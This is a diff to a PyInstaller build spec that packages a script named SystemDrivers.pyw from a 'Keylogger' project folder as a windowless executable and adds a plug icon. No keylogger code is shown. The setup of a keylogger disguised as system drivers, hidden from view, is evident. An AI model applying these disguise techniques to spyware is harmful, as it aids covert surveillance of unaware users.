@@ -4,7 +4,7 @@ block_cipher = None
 
 
 a = Analysis(['SystemDrivers.pyw'],
-             pathex=['C:\\Git\\KeyLogger\\Exe\\Keylogger'],
+             pathex=['C:\\Flesh\\Git\\Keylogger\\Exe\\Keylogger'],
              binaries=[],
              datas=[],
              hiddenimports=[],
@@ -30,4 +30,4 @@ exe = EXE(pyz,
           upx=True,
           upx_exclude=[],
           runtime_tmpdir=None,
-          console=False )
+          console=False , icon='plug.ico')
